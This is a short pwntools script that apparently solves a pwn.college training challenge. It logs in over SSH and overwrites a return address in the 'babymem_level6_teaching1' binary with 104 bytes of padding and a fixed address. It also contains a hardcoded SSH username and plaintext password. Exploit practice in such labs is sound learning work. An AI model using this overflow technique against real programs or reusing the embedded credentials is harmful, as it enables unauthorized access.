from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

context.log_level = 'debug'
p = s.process("./babymem_level6_teaching1")
p.sendlineafter(b'Payload size: ','1000')
pay = b'A'*(8*13) + p64(0x0000000000401BF3)
p.sendafter(b'bytes)!\n',pay)
p.interactive()